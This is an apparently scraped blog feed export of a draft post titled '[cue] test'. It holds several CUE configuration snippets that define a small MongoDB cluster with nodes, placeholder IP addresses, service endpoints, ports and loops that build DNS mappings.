  
  
  <entry>
    <title>ã€cueã€‘test</title>
    <link href="/2023/05/18/cue/%E3%80%90cue%E3%80%91test/"/>
    <url>/2023/05/18/cue/%E3%80%90cue%E3%80%91test/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">NodeConfs: &#123;<br>  master: &#123;<br>    services: &#123;<br>        abcd: &#123;<br>            endpoints: [<br>              &#123;<br>                dns: [<span class="hljs-string">&quot;\(node.name)&quot;</span>]<br>                name: <span class="hljs-string">&quot;test&quot;</span><br>                protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>                ports: <span class="hljs-string">&quot;1234&quot;</span><br>              &#125;<br>            ]<br>        &#125;<br>    &#125;<br>  &#125;<br>  <br>&#125;<br><br><br><br><br>cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongo :<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongoA : &#123;<br>                 <br>                <br>                &#125;<br>                mognoB: &#123;<br>                <br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1111&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2222&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1112&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2223&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>            &#125;,<br>        ]<br>    &#125;   <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: [<br>                      &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;,&#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                  ]<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>                services: &#123;<br>                    mongo : &#123;<br>                      endpoints: &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>æƒ…å†µ1ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>cluster: &#123;<br>spec: &#123;<br>nodes: [<br>&#123;<br>name: <span class="hljs-string">&quot;m1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>services: &#123;<br>mongo: &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;mongosvc1, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;1111&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;2222&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>exporter : &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;exporter, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;m2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,<br>]<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueã€‘test</title>
    <link href="/2023/05/18/cue/unsupported/%E3%80%90cue%E3%80%91test/"/>
    <url>/2023/05/18/cue/unsupported/%E3%80%90cue%E3%80%91test/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 